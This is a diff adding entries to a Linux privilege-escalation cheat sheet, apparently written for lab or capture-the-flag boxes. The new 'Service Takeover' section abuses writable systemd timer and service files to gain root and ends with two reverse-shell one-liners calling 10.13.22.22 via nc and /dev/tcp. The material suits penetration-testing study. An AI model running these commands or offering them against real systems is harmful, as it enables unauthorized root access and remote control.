@@ -22,6 +22,7 @@
       - [SSH Keys](#ssh-keys)
     + [Sudo-Shell escape Sequences](#sudo-shell-escape-sequences)
       - [Zip](#zip)
+      - [npm](#npm)
       - [iftop](#iftop)
       - [find](#find)
       - [nano](#nano)
@@ -35,6 +36,7 @@
       - [Apache2](#apache2)
     + [Sudo -l LD_PRELOAD](#sudo--l-ld-preload)
       - [Sudo -l LD_PRELOAD Method 2](#sudo--l-ld-preload-method-2)
+    + [Sudo -l Service Takeover](#sudo--l-service-takeover)
     + [SUID SYMLINKS CVE-2016-1247](#suid-symlinks-cve-2016-1247)
     + [Cron Jobs File permissions](#cron-jobs-file-permissions)
       - [Cron Jobs File permissions Method 2](#cron-jobs-file-permissions-method-2)
@@ -262,6 +264,9 @@ uid=0(root) gid=0(root) groups=0(root)
 ````
 Sudo -l
 ````
+#### npm
+- ![alt text](https://miro.medium.com/max/2400/1*VucdYx033uiuiMXc7ZxIhQ.png)
+- ![alt text](https://miro.medium.com/max/2400/1*0yhB6pvhjXSAJq1BuFPyxA.png)
 #### iftop
 ````
 sudo /usr/bin/iftop
@@ -397,6 +402,20 @@ gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
 sudo LD_PRELOAD=/tmp/x.so apache2
 ````
 - 5. In command prompt type: `id`
+### Sudo -l Service Takeover
+- ![alt text](https://miro.medium.com/max/2400/1*2HVtq5qvZtanx0WlzaN8dg.png)
+- We have write access to `vulnnet-auto.timer` and `vulnnet.job.service` which are custom services on the host
+- ![alt text](https://miro.medium.com/max/2400/1*eZ7VQJlIzjIvj4elIpWr9A.png)
+- First we modify the `OnCalandar=*:0/30` line to `OnCalandar=*0/1` to make it run every minute versus every 30 minutes 
+- ![alt text](https://miro.medium.com/max/2400/1*UNBgv24NMzWawzj2U7qk2g.png)
+- Can see that the system executes the `/bin/df` command
+- ![alt text](https://miro.medium.com/max/2400/1*N-S2p6n1i2Q17nLlavjwBQ.png)
+- We can modify this to spawn a reverse shell via our script
+- Can also call a reverse shell on the box 
+````
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.13.22.22 1111 >/tmp/f
+bash -i >& /dev/tcp/10.13.22.22/1111 0>&1
+````
 ### SUID SYMLINKS CVE-2016-1247
 - Detection
 ````
